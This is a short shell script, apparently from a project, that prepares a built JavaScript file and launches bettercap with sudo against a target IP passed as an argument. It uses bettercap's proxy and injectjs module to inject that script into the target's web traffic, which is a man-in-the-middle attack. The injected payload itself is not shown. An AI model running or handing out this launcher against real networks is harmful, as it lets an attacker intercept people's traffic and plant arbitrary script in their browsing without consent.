#!/bin/sh

BASEDIR=$(dirname -- "$(readlink -f -- "${BASH_SOURCE}")")

SOURCEIP=$1

iconv -f utf-8 -t ascii//TRANSLIT dist/main.js > dist/main2.js
mv -f dist/main2.js dist/main.js
sudo bettercap -T ${SOURCEIP} --proxy --proxy-module injectjs --js-file dist/main.js
